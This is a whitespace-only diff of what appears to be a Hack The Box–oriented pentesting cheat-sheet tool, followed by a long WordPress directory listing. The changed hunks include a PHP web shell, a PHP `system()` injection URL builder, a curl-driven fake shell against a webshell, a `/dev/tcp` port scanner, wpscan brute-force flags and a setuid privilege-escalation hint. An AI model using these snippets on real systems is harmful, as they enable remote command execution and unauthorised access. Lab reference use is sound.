@@ -402,20 +402,20 @@ python_urlEncode.output = """[*] Convert strings into urlencoded strings for req
 # Example: echo 'test' => test
 import urllib
 
-	url = "http://10.10.10.27/admin.php?html="
-	cmd = input("[ Fake Shell ] ")
-	phpCode = urllib.parse.quote_plus(f'<?php system("{cmd}");?>')
-	finalUrl = url + phpCode
+    url = "http://10.10.10.27/admin.php?html="
+    cmd = input("[ Fake Shell ] ")
+    phpCode = urllib.parse.quote_plus(f'<?php system("{cmd}");?>')
+    finalUrl = url + phpCode
 
 
 [*] Get strings from html easily
 
 from bs4 import BeautifulSoup
-	res = requests.post(url, headers=headers, data=data).text
-	res = BeautifulSoup(res, 'html.parser')
-	res = res.find_all('tbody')[0]
-	res = res.get_text().strip()
-	print(res)
+    res = requests.post(url, headers=headers, data=data).text
+    res = BeautifulSoup(res, 'html.parser')
+    res = res.find_all('tbody')[0]
+    res = res.get_text().strip()
+    print(res)
 """
 
 ######################################
@@ -480,7 +480,7 @@ manualTcpScanInBash.sub_category = "Bash"
 manualTcpScanInBash.output = """[*] Manually scan ports in bash when no nmap or similar
 
 for port in $(seq 1 65355); do
-	timeout 1 bash -c "echo > /dev/tcp/10.10.10.123/$port" && echo "[*] Open Port => $port" &
+    timeout 1 bash -c "echo > /dev/tcp/10.10.10.123/$port" && echo "[*] Open Port => $port" &
 done; wait
 """
 
@@ -547,23 +547,23 @@ wpscan.sub_category = "Web"
 wpscan.output = """[*] WPScan - WordPress Security Scanner
 
 wpscan --url www.website.com              # Non-intrusive scan
-	-t 50                                 # Force 50 threads
-	--cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
-	--wp-content-dir /DIR                 # Specific correct /path when is not the default
-	--wp-plugins-dir /DIR                 # Specific correct /path when is not the default
-	--enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
-										  #                ap (All plugins),
-										  #                p (Plugins),
-										  #                vt (Vulnerable themes),
-										  #                at (All themes),
-										  #                t (Themes),
-										  #                tt (Timthumbs),
-										  #                cb (Config backups),
-										  #                u (User IDs)
-										  # Format: [choice],[choice],[choice],...
-	-P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
-	-U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
-	--update                              # Update database
+    -t 50                                 # Force 50 threads
+    --cookie-string COOKIE                # Cookie string to use in requests, format: cookie1=value1[; cookie2=value2]
+    --wp-content-dir /DIR                 # Specific correct /path when is not the default
+    --wp-plugins-dir /DIR                 # Specific correct /path when is not the default
+    --enumerate [OPTIONS]                 # Valid options: vp (Vulnerable plugins),
+                                          #                ap (All plugins),
+                                          #                p (Plugins),
+                                          #                vt (Vulnerable themes),
+                                          #                at (All themes),
+                                          #                t (Themes),
+                                          #                tt (Timthumbs),
+                                          #                cb (Config backups),
+                                          #                u (User IDs)
+                                          # Format: [choice],[choice],[choice],...
+    -P, --passwords /path/wordlist.txt    # List of password to brute force. If no --usernames, user enumeration will be run
+    -U, --usernames /path/wordlist.txt    # List of usernames to brute force. Examples: 'a1', 'a1,a2,a3', '/tmp/a.txt'
+    --update                              # Update database
 
 # Examples:
 wpscan --url www.website.com
@@ -623,10 +623,10 @@ old=$(ps -eo command)
 
 echo -e "Start at: $(date +%H:%M:%S)"
 while true; do
-		echo -ne "Now: $(date +%H:%M:%S)\\r"
-		new=$(ps -eo command)
-		diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
-		old=$new
+        echo -ne "Now: $(date +%H:%M:%S)\\r"
+        new=$(ps -eo command)
+        diff <(echo "$old") <(echo "$new") | grep "[\<\>]" | grep -vE "croncheck.sh|command"
+        old=$new
 done
 """
 
@@ -733,7 +733,7 @@ capabilities.sub_category = "Enumeration"
 capabilities.output = """[*] Capabilities - setcap / getcap / setuid
 
 getcap -r / 2>/dev/null               # python with that can easily convert user to root.
-									  # import os; os.setuid(0), os.system("/bin/bash")
+                                      # import os; os.setuid(0), os.system("/bin/bash")
 setcap cap_setuid+ep /path/to/binary  # set uid for scale faster praticaly invisible!
 """
 
@@ -749,8 +749,8 @@ findSubDomain_dns.sub_category = "DNS"
 findSubDomain_dns.output = """[*] Some tools to find sub domains...
 
 nslookup
-	> server 10.10.10.13
-	> 10.10.10.13
+    > server 10.10.10.13
+    > 10.10.10.13
 
 dig @10.10.10.123 friendzone.red axfr
 dnsenum --server 10.10.10.224 --threads 50 -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
@@ -916,8 +916,8 @@ webShell.sub_category = "RCE"
 webShell.output = f"""[*] Web Shell em PHP
 
 <?php
-	echo "\\nURL Shell... url?cmd=<command>\\n\\n";
-	echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
+    echo "\\nURL Shell... url?cmd=<command>\\n\\n";
+    echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>";
 ?>
 
 # Or...
@@ -940,8 +940,8 @@ fakeShell.output = """[*] Script in bash to simule shell via webshell RCE
 #!/bin/bash
 
 function ctrl_c() {
-	echo -e "\n[!]Saindo...\n"
-	exit 1
+    echo -e "\n[!]Saindo...\n"
+    exit 1
 }
 # Ctrl+C
 trap ctrl_c INT
@@ -950,10 +950,10 @@ declare -r mainUrl="http://sec03.rentahacker.htb/shell.php"
 declare -r paramName="hidden"
 
 while true; do
-	echo -n "[fakeShell ~] " && read -r command
-	echo
-	curl -s -X GET -G $mainUrl --data-urlencode "$paramName=$command"
-	echo
+    echo -n "[fakeShell ~] " && read -r command
+    echo
+    curl -s -X GET -G $mainUrl --data-urlencode "$paramName=$command"
+    echo
 done
 
 """
@@ -974,361 +974,361 @@ tree -L 3 --dirsfirst . -f -x
 
 .
 └── ./wordpress
-	├── ./wordpress/wp-admin
-	│   ├── ./wordpress/wp-admin/css
-	│   ├── ./wordpress/wp-admin/images
-	│   ├── ./wordpress/wp-admin/includes
-	│   ├── ./wordpress/wp-admin/js
-	│   ├── ./wordpress/wp-admin/maint
-	│   ├── ./wordpress/wp-admin/network
-	│   ├── ./wordpress/wp-admin/user
-	│   ├── ./wordpress/wp-admin/about.php
-	│   ├── ./wordpress/wp-admin/admin-ajax.php
-	│   ├── ./wordpress/wp-admin/admin-footer.php
-	│   ├── ./wordpress/wp-admin/admin-functions.php
-	│   ├── ./wordpress/wp-admin/admin-header.php
-	│   ├── ./wordpress/wp-admin/admin.php
-	│   ├── ./wordpress/wp-admin/admin-post.php
-	│   ├── ./wordpress/wp-admin/async-upload.php
-	│   ├── ./wordpress/wp-admin/authorize-application.php
-	│   ├── ./wordpress/wp-admin/comment.php
-	│   ├── ./wordpress/wp-admin/credits.php
-	│   ├── ./wordpress/wp-admin/custom-background.php
-	│   ├── ./wordpress/wp-admin/custom-header.php
-	│   ├── ./wordpress/wp-admin/customize.php
-	│   ├── ./wordpress/wp-admin/edit-comments.php
-	│   ├── ./wordpress/wp-admin/edit-form-advanced.php
-	│   ├── ./wordpress/wp-admin/edit-form-blocks.php
-	│   ├── ./wordpress/wp-admin/edit-form-comment.php
-	│   ├── ./wordpress/wp-admin/edit-link-form.php
-	│   ├── ./wordpress/wp-admin/edit.php
-	│   ├── ./wordpress/wp-admin/edit-tag-form.php
-	│   ├── ./wordpress/wp-admin/edit-tags.php
-	│   ├── ./wordpress/wp-admin/erase-personal-data.php
-	│   ├── ./wordpress/wp-admin/export-personal-data.php
-	│   ├── ./wordpress/wp-admin/export.php
-	│   ├── ./wordpress/wp-admin/freedoms.php
-	│   ├── ./wordpress/wp-admin/import.php
-	│   ├── ./wordpress/wp-admin/index.php
-	│   ├── ./wordpress/wp-admin/install-helper.php
-	│   ├── ./wordpress/wp-admin/install.php
-	│   ├── ./wordpress/wp-admin/link-add.php
-	│   ├── ./wordpress/wp-admin/link-manager.php
-	│   ├── ./wordpress/wp-admin/link-parse-opml.php
-	│   ├── ./wordpress/wp-admin/link.php
-	│   ├── ./wordpress/wp-admin/load-scripts.php
-	│   ├── ./wordpress/wp-admin/load-styles.php
-	│   ├── ./wordpress/wp-admin/media-new.php
-	│   ├── ./wordpress/wp-admin/media.php
-	│   ├── ./wordpress/wp-admin/media-upload.php
-	│   ├── ./wordpress/wp-admin/menu-header.php
-	│   ├── ./wordpress/wp-admin/menu.php
-	│   ├── ./wordpress/wp-admin/moderation.php
-	│   ├── ./wordpress/wp-admin/ms-admin.php
-	│   ├── ./wordpress/wp-admin/ms-delete-site.php
-	│   ├── ./wordpress/wp-admin/ms-edit.php
-	│   ├── ./wordpress/wp-admin/ms-options.php
-	│   ├── ./wordpress/wp-admin/ms-sites.php
-	│   ├── ./wordpress/wp-admin/ms-themes.php
-	│   ├── ./wordpress/wp-admin/ms-upgrade-network.php
-	│   ├── ./wordpress/wp-admin/ms-users.php
-	│   ├── ./wordpress/wp-admin/my-sites.php
-	│   ├── ./wordpress/wp-admin/nav-menus.php
-	│   ├── ./wordpress/wp-admin/network.php
-	│   ├── ./wordpress/wp-admin/options-discussion.php
-	│   ├── ./wordpress/wp-admin/options-general.php
-	│   ├── ./wordpress/wp-admin/options-head.php
-	│   ├── ./wordpress/wp-admin/options-media.php
-	│   ├── ./wordpress/wp-admin/options-permalink.php
-	│   ├── ./wordpress/wp-admin/options.php
-	│   ├── ./wordpress/wp-admin/options-privacy.php
-	│   ├── ./wordpress/wp-admin/options-reading.php
-	│   ├── ./wordpress/wp-admin/options-writing.php
-	│   ├── ./wordpress/wp-admin/plugin-editor.php
-	│   ├── ./wordpress/wp-admin/plugin-install.php
-	│   ├── ./wordpress/wp-admin/plugins.php
-	│   ├── ./wordpress/wp-admin/post-new.php
-	│   ├── ./wordpress/wp-admin/post.php
-	│   ├── ./wordpress/wp-admin/press-this.php
-	│   ├── ./wordpress/wp-admin/privacy.php
-	│   ├── ./wordpress/wp-admin/privacy-policy-guide.php
-	│   ├── ./wordpress/wp-admin/profile.php
-	│   ├── ./wordpress/wp-admin/revision.php
-	│   ├── ./wordpress/wp-admin/setup-config.php
-	│   ├── ./wordpress/wp-admin/site-health-info.php
-	│   ├── ./wordpress/wp-admin/site-health.php
-	│   ├── ./wordpress/wp-admin/term.php
-	│   ├── ./wordpress/wp-admin/theme-editor.php
-	│   ├── ./wordpress/wp-admin/theme-install.php
-	│   ├── ./wordpress/wp-admin/themes.php
-	│   ├── ./wordpress/wp-admin/tools.php
-	│   ├── ./wordpress/wp-admin/update-core.php
-	│   ├── ./wordpress/wp-admin/update.php
-	│   ├── ./wordpress/wp-admin/upgrade-functions.php
-	│   ├── ./wordpress/wp-admin/upgrade.php
-	│   ├── ./wordpress/wp-admin/upload.php
-	│   ├── ./wordpress/wp-admin/user-edit.php
-	│   ├── ./wordpress/wp-admin/user-new.php
-	│   ├── ./wordpress/wp-admin/users.php
-	│   ├── ./wordpress/wp-admin/widgets-form-blocks.php
-	│   ├── ./wordpress/wp-admin/widgets-form.php
-	│   └── ./wordpress/wp-admin/widgets.php
-	├── ./wordpress/wp-content
-	│   ├── ./wordpress/wp-content/plugins
-	│   ├── ./wordpress/wp-content/themes
-	│   └── ./wordpress/wp-content/index.php
-	├── ./wordpress/wp-includes
-	│   ├── ./wordpress/wp-includes/assets
-	│   ├── ./wordpress/wp-includes/block-patterns
-	│   ├── ./wordpress/wp-includes/blocks
-	│   ├── ./wordpress/wp-includes/block-supports
-	│   ├── ./wordpress/wp-includes/certificates
-	│   ├── ./wordpress/wp-includes/css
-	│   ├── ./wordpress/wp-includes/customize
-	│   ├── ./wordpress/wp-includes/fonts
-	│   ├── ./wordpress/wp-includes/ID3
-	│   ├── ./wordpress/wp-includes/images
-	│   ├── ./wordpress/wp-includes/IXR
-	│   ├── ./wordpress/wp-includes/js
-	│   ├── ./wordpress/wp-includes/PHPMailer
-	│   ├── ./wordpress/wp-includes/pomo
-	│   ├── ./wordpress/wp-includes/random_compat
-	│   ├── ./wordpress/wp-includes/Requests
-	│   ├── ./wordpress/wp-includes/rest-api
-	│   ├── ./wordpress/wp-includes/SimplePie
-	│   ├── ./wordpress/wp-includes/sitemaps
-	│   ├── ./wordpress/wp-includes/sodium_compat
-	│   ├── ./wordpress/wp-includes/Text
-	│   ├── ./wordpress/wp-includes/theme-compat
-	│   ├── ./wordpress/wp-includes/widgets
-	│   ├── ./wordpress/wp-includes/admin-bar.php
-	│   ├── ./wordpress/wp-includes/atomlib.php
-	│   ├── ./wordpress/wp-includes/author-template.php
-	│   ├── ./wordpress/wp-includes/block-editor.php
-	│   ├── ./wordpress/wp-includes/block-patterns.php
-	│   ├── ./wordpress/wp-includes/blocks.php
-	│   ├── ./wordpress/wp-includes/block-template.php
-	│   ├── ./wordpress/wp-includes/block-template-utils.php
-	│   ├── ./wordpress/wp-includes/bookmark.php
-	│   ├── ./wordpress/wp-includes/bookmark-template.php
-	│   ├── ./wordpress/wp-includes/cache-compat.php
-	│   ├── ./wordpress/wp-includes/cache.php
-	│   ├── ./wordpress/wp-includes/canonical.php
-	│   ├── ./wordpress/wp-includes/capabilities.php
-	│   ├── ./wordpress/wp-includes/category.php
-	│   ├── ./wordpress/wp-includes/category-template.php
-	│   ├── ./wordpress/wp-includes/class-feed.php
-	│   ├── ./wordpress/wp-includes/class-http.php
-	│   ├── ./wordpress/wp-includes/class-IXR.php
-	│   ├── ./wordpress/wp-includes/class-json.php
-	│   ├── ./wordpress/wp-includes/class-oembed.php
-	│   ├── ./wordpress/wp-includes/class-phpass.php
-	│   ├── ./wordpress/wp-includes/class-phpmailer.php
-	│   ├── ./wordpress/wp-includes/class-pop3.php
-	│   ├── ./wordpress/wp-includes/class-requests.php
-	│   ├── ./wordpress/wp-includes/class-simplepie.php
-	│   ├── ./wordpress/wp-includes/class-smtp.php
-	│   ├── ./wordpress/wp-includes/class-snoopy.php
-	│   ├── ./wordpress/wp-includes/class-walker-category-dropdown.php
-	│   ├── ./wordpress/wp-includes/class-walker-category.php
-	│   ├── ./wordpress/wp-includes/class-walker-comment.php
-	│   ├── ./wordpress/wp-includes/class-walker-nav-menu.php
-	│   ├── ./wordpress/wp-includes/class-walker-page-dropdown.php
-	│   ├── ./wordpress/wp-includes/class-walker-page.php
-	│   ├── ./wordpress/wp-includes/class-wp-admin-bar.php
-	│   ├── ./wordpress/wp-includes/class-wp-ajax-response.php
-	│   ├── ./wordpress/wp-includes/class-wp-application-passwords.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-editor-context.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-list.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-parser.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-pattern-categories-registry.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-patterns-registry.php
-	│   ├── ./wordpress/wp-includes/class-wp-block.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-styles-registry.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-supports.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-template.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-type.php
-	│   ├── ./wordpress/wp-includes/class-wp-block-type-registry.php
-	│   ├── ./wordpress/wp-includes/class-wp-comment.php
-	│   ├── ./wordpress/wp-includes/class-wp-comment-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-control.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-manager.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-nav-menus.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-panel.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-section.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-setting.php
-	│   ├── ./wordpress/wp-includes/class-wp-customize-widgets.php
-	│   ├── ./wordpress/wp-includes/class-wp-date-query.php
-	│   ├── ./wordpress/wp-includes/class.wp-dependencies.php
-	│   ├── ./wordpress/wp-includes/class-wp-dependency.php
-	│   ├── ./wordpress/wp-includes/class-wp-editor.php
-	│   ├── ./wordpress/wp-includes/class-wp-embed.php
-	│   ├── ./wordpress/wp-includes/class-wp-error.php
-	│   ├── ./wordpress/wp-includes/class-wp-fatal-error-handler.php
-	│   ├── ./wordpress/wp-includes/class-wp-feed-cache.php
-	│   ├── ./wordpress/wp-includes/class-wp-feed-cache-transient.php
-	│   ├── ./wordpress/wp-includes/class-wp-hook.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-cookie.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-curl.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-encoding.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-ixr-client.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-proxy.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-requests-hooks.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-requests-response.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-response.php
-	│   ├── ./wordpress/wp-includes/class-wp-http-streams.php
-	│   ├── ./wordpress/wp-includes/class-wp-image-editor-gd.php
-	│   ├── ./wordpress/wp-includes/class-wp-image-editor-imagick.php
-	│   ├── ./wordpress/wp-includes/class-wp-image-editor.php
-	│   ├── ./wordpress/wp-includes/class-wp-list-util.php
-	│   ├── ./wordpress/wp-includes/class-wp-locale.php
-	│   ├── ./wordpress/wp-includes/class-wp-locale-switcher.php
-	│   ├── ./wordpress/wp-includes/class-wp-matchesmapregex.php
-	│   ├── ./wordpress/wp-includes/class-wp-metadata-lazyloader.php
-	│   ├── ./wordpress/wp-includes/class-wp-meta-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-network.php
-	│   ├── ./wordpress/wp-includes/class-wp-network-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-object-cache.php
-	│   ├── ./wordpress/wp-includes/class-wp-oembed-controller.php
-	│   ├── ./wordpress/wp-includes/class-wp-oembed.php
-	│   ├── ./wordpress/wp-includes/class-wp-paused-extensions-storage.php
-	│   ├── ./wordpress/wp-includes/class-wp.php
-	│   ├── ./wordpress/wp-includes/class-wp-post.php
-	│   ├── ./wordpress/wp-includes/class-wp-post-type.php
-	│   ├── ./wordpress/wp-includes/class-wp-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-cookie-service.php
-	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-email-service.php
-	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-key-service.php
-	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode-link-service.php
-	│   ├── ./wordpress/wp-includes/class-wp-recovery-mode.php
-	│   ├── ./wordpress/wp-includes/class-wp-rewrite.php
-	│   ├── ./wordpress/wp-includes/class-wp-role.php
-	│   ├── ./wordpress/wp-includes/class-wp-roles.php
-	│   ├── ./wordpress/wp-includes/class.wp-scripts.php
-	│   ├── ./wordpress/wp-includes/class-wp-session-tokens.php
-	│   ├── ./wordpress/wp-includes/class-wp-simplepie-file.php
-	│   ├── ./wordpress/wp-includes/class-wp-simplepie-sanitize-kses.php
-	│   ├── ./wordpress/wp-includes/class-wp-site.php
-	│   ├── ./wordpress/wp-includes/class-wp-site-query.php
-	│   ├── ./wordpress/wp-includes/class.wp-styles.php
-	│   ├── ./wordpress/wp-includes/class-wp-taxonomy.php
-	│   ├── ./wordpress/wp-includes/class-wp-tax-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-term.php
-	│   ├── ./wordpress/wp-includes/class-wp-term-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-inline.php
-	│   ├── ./wordpress/wp-includes/class-wp-text-diff-renderer-table.php
-	│   ├── ./wordpress/wp-includes/class-wp-theme-json.php
-	│   ├── ./wordpress/wp-includes/class-wp-theme-json-resolver.php
-	│   ├── ./wordpress/wp-includes/class-wp-theme.php
-	│   ├── ./wordpress/wp-includes/class-wp-user-meta-session-tokens.php
-	│   ├── ./wordpress/wp-includes/class-wp-user.php
-	│   ├── ./wordpress/wp-includes/class-wp-user-query.php
-	│   ├── ./wordpress/wp-includes/class-wp-user-request.php
-	│   ├── ./wordpress/wp-includes/class-wp-walker.php
-	│   ├── ./wordpress/wp-includes/class-wp-widget-factory.php
-	│   ├── ./wordpress/wp-includes/class-wp-widget.php
-	│   ├── ./wordpress/wp-includes/class-wp-xmlrpc-server.php
-	│   ├── ./wordpress/wp-includes/comment.php
-	│   ├── ./wordpress/wp-includes/comment-template.php
-	│   ├── ./wordpress/wp-includes/compat.php
-	│   ├── ./wordpress/wp-includes/cron.php
-	│   ├── ./wordpress/wp-includes/date.php
-	│   ├── ./wordpress/wp-includes/default-constants.php
-	│   ├── ./wordpress/wp-includes/default-filters.php
-	│   ├── ./wordpress/wp-includes/default-widgets.php
-	│   ├── ./wordpress/wp-includes/deprecated.php
-	│   ├── ./wordpress/wp-includes/embed.php
-	│   ├── ./wordpress/wp-includes/embed-template.php
-	│   ├── ./wordpress/wp-includes/error-protection.php
-	│   ├── ./wordpress/wp-includes/feed-atom-comments.php
-	│   ├── ./wordpress/wp-includes/feed-atom.php
-	│   ├── ./wordpress/wp-includes/feed.php
-	│   ├── ./wordpress/wp-includes/feed-rdf.php
-	│   ├── ./wordpress/wp-includes/feed-rss2-comments.php
-	│   ├── ./wordpress/wp-includes/feed-rss2.php
-	│   ├── ./wordpress/wp-includes/feed-rss.php
-	│   ├── ./wordpress/wp-includes/formatting.php
-	│   ├── ./wordpress/wp-includes/functions.php
-	│   ├── ./wordpress/wp-includes/functions.wp-scripts.php
-	│   ├── ./wordpress/wp-includes/functions.wp-styles.php
-	│   ├── ./wordpress/wp-includes/general-template.php
-	│   ├── ./wordpress/wp-includes/http.php
-	│   ├── ./wordpress/wp-includes/https-detection.php
-	│   ├── ./wordpress/wp-includes/https-migration.php
-	│   ├── ./wordpress/wp-includes/kses.php
-	│   ├── ./wordpress/wp-includes/l10n.php
-	│   ├── ./wordpress/wp-includes/link-template.php
-	│   ├── ./wordpress/wp-includes/load.php
-	│   ├── ./wordpress/wp-includes/locale.php
-	│   ├── ./wordpress/wp-includes/media.php
-	│   ├── ./wordpress/wp-includes/media-template.php
-	│   ├── ./wordpress/wp-includes/meta.php
-	│   ├── ./wordpress/wp-includes/ms-blogs.php
-	│   ├── ./wordpress/wp-includes/ms-default-constants.php
-	│   ├── ./wordpress/wp-includes/ms-default-filters.php
-	│   ├── ./wordpress/wp-includes/ms-deprecated.php
-	│   ├── ./wordpress/wp-includes/ms-files.php
-	│   ├── ./wordpress/wp-includes/ms-functions.php
-	│   ├── ./wordpress/wp-includes/ms-load.php
-	│   ├── ./wordpress/wp-includes/ms-network.php
-	│   ├── ./wordpress/wp-includes/ms-settings.php
-	│   ├── ./wordpress/wp-includes/ms-site.php
-	│   ├── ./wordpress/wp-includes/nav-menu.php
-	│   ├── ./wordpress/wp-includes/nav-menu-template.php
-	│   ├── ./wordpress/wp-includes/option.php
-	│   ├── ./wordpress/wp-includes/pluggable-deprecated.php
-	│   ├── ./wordpress/wp-includes/pluggable.php
-	│   ├── ./wordpress/wp-includes/plugin.php
-	│   ├── ./wordpress/wp-includes/post-formats.php
-	│   ├── ./wordpress/wp-includes/post.php
-	│   ├── ./wordpress/wp-includes/post-template.php
-	│   ├── ./wordpress/wp-includes/post-thumbnail-template.php
-	│   ├── ./wordpress/wp-includes/query.php
-	│   ├── ./wordpress/wp-includes/registration-functions.php
-	│   ├── ./wordpress/wp-includes/registration.php
-	│   ├── ./wordpress/wp-includes/rest-api.php
-	│   ├── ./wordpress/wp-includes/revision.php
-	│   ├── ./wordpress/wp-includes/rewrite.php
-	│   ├── ./wordpress/wp-includes/robots-template.php
-	│   ├── ./wordpress/wp-includes/rss-functions.php
-	│   ├── ./wordpress/wp-includes/rss.php
-	│   ├── ./wordpress/wp-includes/script-loader.php
-	│   ├── ./wordpress/wp-includes/session.php
-	│   ├── ./wordpress/wp-includes/shortcodes.php
-	│   ├── ./wordpress/wp-includes/sitemaps.php
-	│   ├── ./wordpress/wp-includes/spl-autoload-compat.php
-	│   ├── ./wordpress/wp-includes/taxonomy.php
-	│   ├── ./wordpress/wp-includes/template-canvas.php
-	│   ├── ./wordpress/wp-includes/template-loader.php
-	│   ├── ./wordpress/wp-includes/template.php
-	│   ├── ./wordpress/wp-includes/theme-i18n.json
-	│   ├── ./wordpress/wp-includes/theme.json
-	│   ├── ./wordpress/wp-includes/theme.php
-	│   ├── ./wordpress/wp-includes/theme-templates.php
-	│   ├── ./wordpress/wp-includes/update.php
-	│   ├── ./wordpress/wp-includes/user.php
-	│   ├── ./wordpress/wp-includes/vars.php
-	│   ├── ./wordpress/wp-includes/version.php
-	│   ├── ./wordpress/wp-includes/widgets.php
-	│   ├── ./wordpress/wp-includes/wlwmanifest.xml
-	│   ├── ./wordpress/wp-includes/wp-db.php
-	│   └── ./wordpress/wp-includes/wp-diff.php
-	├── ./wordpress/index.php
-	├── ./wordpress/license.txt
-	├── ./wordpress/readme.html
-	├── ./wordpress/wp-activate.php
-	├── ./wordpress/wp-blog-header.php
-	├── ./wordpress/wp-comments-post.php
-	├── ./wordpress/wp-config-sample.php
-	├── ./wordpress/wp-cron.php
-	├── ./wordpress/wp-links-opml.php
-	├── ./wordpress/wp-load.php
-	├── ./wordpress/wp-login.php
-	├── ./wordpress/wp-mail.php
-	├── ./wordpress/wp-settings.php
-	├── ./wordpress/wp-signup.php
-	├── ./wordpress/wp-trackback.php
-	└── ./wordpress/xmlrpc.php
+    ├── ./wordpress/wp-admin
+    │   ├── ./wordpress/wp-admin/css
+    │   ├── ./wordpress/wp-admin/images
+    │   ├── ./wordpress/wp-admin/includes
+    │   ├── ./wordpress/wp-admin/js
+    │   ├── ./wordpress/wp-admin/maint
+    │   ├── ./wordpress/wp-admin/network
+    │   ├── ./wordpress/wp-admin/user
+    │   ├── ./wordpress/wp-admin/about.php
+    │   ├── ./wordpress/wp-admin/admin-ajax.php
+    │   ├── ./wordpress/wp-admin/admin-footer.php
+    │   ├── ./wordpress/wp-admin/admin-functions.php
+    │   ├── ./wordpress/wp-admin/admin-header.php
+    │   ├── ./wordpress/wp-admin/admin.php
+    │   ├── ./wordpress/wp-admin/admin-post.php
+    │   ├── ./wordpress/wp-admin/async-upload.php
+    │   ├── ./wordpress/wp-admin/authorize-application.php
+    │   ├── ./wordpress/wp-admin/comment.php
+    │   ├── ./wordpress/wp-admin/credits.php
+    │   ├── ./wordpress/wp-admin/custom-background.php
+    │   ├── ./wordpress/wp-admin/custom-header.php
+    │   ├── ./wordpress/wp-admin/customize.php
+    │   ├── ./wordpress/wp-admin/edit-comments.php
+    │   ├── ./wordpress/wp-admin/edit-form-advanced.php
+    │   ├── ./wordpress/wp-admin/edit-form-blocks.php
+    │   ├── ./wordpress/wp-admin/edit-form-comment.php
+    │   ├── ./wordpress/wp-admin/edit-link-form.php
+    │   ├── ./wordpress/wp-admin/edit.php
+    │   ├── ./wordpress/wp-admin/edit-tag-form.php
+    │   ├── ./wordpress/wp-admin/edit-tags.php
+    │   ├── ./wordpress/wp-admin/erase-personal-data.php
+    │   ├── ./wordpress/wp-admin/export-personal-data.php
+    │   ├── ./wordpress/wp-admin/export.php
+    │   ├── ./wordpress/wp-admin/freedoms.php
+    │   ├── ./wordpress/wp-admin/import.php
+    │   ├── ./wordpress/wp-admin/index.php
+    │   ├── ./wordpress/wp-admin/install-helper.php
+    │   ├── ./wordpress/wp-admin/install.php
+    │   ├── ./wordpress/wp-admin/link-add.php
+    │   ├── ./wordpress/wp-admin/link-manager.php
+    │   ├── ./wordpress/wp-admin/link-parse-opml.php
+    │   ├── ./wordpress/wp-admin/link.php
+    │   ├── ./wordpress/wp-admin/load-scripts.php
+    │   ├── ./wordpress/wp-admin/load-styles.php
+    │   ├── ./wordpress/wp-admin/media-new.php
+    │   ├── ./wordpress/wp-admin/media.php
+    │   ├── ./wordpress/wp-admin/media-upload.php
+    │   ├── ./wordpress/wp-admin/menu-header.php
+    │   ├── ./wordpress/wp-admin/menu.php
+    │   ├── ./wordpress/wp-admin/moderation.php
+    │   ├── ./wordpress/wp-admin/ms-admin.php
+    │   ├── ./wordpress/wp-admin/ms-delete-site.php
+    │   ├── ./wordpress/wp-admin/ms-edit.php
+    │   ├── ./wordpress/wp-admin/ms-options.php
+    │   ├── ./wordpress/wp-admin/ms-sites.php
+    │   ├── ./wordpress/wp-admin/ms-themes.php
+    │   ├── ./wordpress/wp-admin/ms-upgrade-network.php
+    │   ├── ./wordpress/wp-admin/ms-users.php
+    │   ├── ./wordpress/wp-admin/my-sites.php
+    │   ├── ./wordpress/wp-admin/nav-menus.php
+    │   ├── ./wordpress/wp-admin/network.php
+    │   ├── ./wordpress/wp-admin/options-discussion.php
+    │   ├── ./wordpress/wp-admin/options-general.php
+    │   ├── ./wordpress/wp-admin/options-head.php
+    │   ├── ./wordpress/wp-admin/options-media.php
+    │   ├── ./wordpress/wp-admin/options-permalink.php
+    │   ├── ./wordpress/wp-admin/options.php
+    │   ├── ./wordpress/wp-admin/options-privacy.php
+    │   ├── ./wordpress/wp-admin/options-reading.php
+    │   ├── ./wordpress/wp-admin/options-writing.php
+    │   ├── ./wordpress/wp-admin/plugin-editor.php
+    │   ├── ./wordpress/wp-admin/plugin-install.php
+    │   ├── ./wordpress/wp-admin/plugins.php
+    │   ├── ./wordpress/wp-admin/post-new.php
+    │   ├── ./wordpress/wp-admin/post.php
+    │   ├── ./wordpress/wp-admin/press-this.php
+    │   ├── ./wordpress/wp-admin/privacy.php
+    │   ├── ./wordpress/wp-admin/privacy-policy-guide.php
+    │   ├── ./wordpress/wp-admin/profile.php
+    │   ├── ./wordpress/wp-admin/revision.php
+    │   ├── ./wordpress/wp-admin/setup-config.php
+    │   ├── ./wordpress/wp-admin/site-health-info.php
